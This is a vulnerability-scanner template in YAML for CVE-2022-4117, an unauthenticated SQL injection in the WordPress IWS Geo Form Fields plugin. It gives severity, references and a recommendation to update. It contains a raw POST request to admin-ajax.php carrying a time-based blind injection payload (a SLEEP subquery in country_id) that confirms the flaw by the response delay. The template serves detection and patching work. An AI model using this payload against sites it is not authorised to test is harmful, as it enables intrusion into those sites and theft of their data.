id: CVE-2022-4117
info:
  name: WordPress IWS Geo Form Fields <=1.0 - SQL Injection
  author: theamanrawat
  severity: critical
  description: WordPress IWS Geo Form Fields plugin version 1.0 has a SQL injection
    vulnerability allowing attackers to access sensitive information, modify data
    and execute unauthorized administrative operations.
  reference:
  - https://wpscan.com/vulnerability/1fac3eb4-13c0-442d-b27c-7b7736208193
  - https://wordpress.org/plugins/iws-geo-form-fields/
  - https://nvd.nist.gov/vuln/detail/CVE-2022-4117
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-4117
    cwe-id: CWE-89
  metadata:
    verified: 'true'
    impact: The SQL injection vulnerability in the WordPress IWS Geo Form Fields plugin
      can result in an attacker gaining unauthorized access and control over sensitive
      information and operations of the affected site.
    recommendation: It is recommended to update WordPress IWS Geo Form Fields plugin
      to version 1.1 or higher to mitigate the SQL injection vulnerability.
  tags: cve,cve2022,sqli,wordpress,wp-plugin,wp,iws-geo-form-fields,wpscan
requests:
- raw:
  - '@timeout: 15s

    POST /wp-admin/admin-ajax.php?action=iws_gff_fetch_states HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    country_id=1%20AND%20(SELECT%2042%20FROM%20(SELECT(SLEEP(6)))b)

    '
  matchers:
  - type: dsl
    dsl:
    - duration>=6
    - status_code == 200
    - contains(body, "\"status\":200") && contains(body, "{\"html\":")
    condition: and
